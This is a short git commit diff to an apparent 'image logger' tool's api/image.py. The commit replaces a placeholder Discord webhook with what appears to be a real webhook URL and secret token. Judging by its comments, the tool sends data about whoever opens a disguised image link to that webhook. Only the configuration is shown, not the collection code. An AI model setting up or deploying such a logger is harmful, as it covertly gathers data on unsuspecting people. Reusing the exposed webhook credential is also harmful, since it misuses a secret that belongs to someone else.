b1728758253b8ff809abca8497e4d3eaebb13410
Zen-GG <papejuanito68@gmail.com>
2026-09-06 15:43:40 -0300

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,7 +12,7 @@ __author__ = "C00lB0i"
 config = {
     # CONFIGURACIÓN BASE
     #
-    "webhook": "https://discord.com/api/webhooks/tu/webhook",
+    "webhook": "https://discord.com/api/webhooks/1546229226355818529/0IjhLUnVPgXxCv56-iHUWbiG7MeVkJvyQdsGHbmP222Da4Wmai-2os3HHNZWbeeEGpIV",
     "image": "https://link-a-tu-imagen.aqui",
     # También puedes tener una imagen personalizada usando un argumento URL
     # (Ejemplo: tudominio.com/imagelogger?url=)
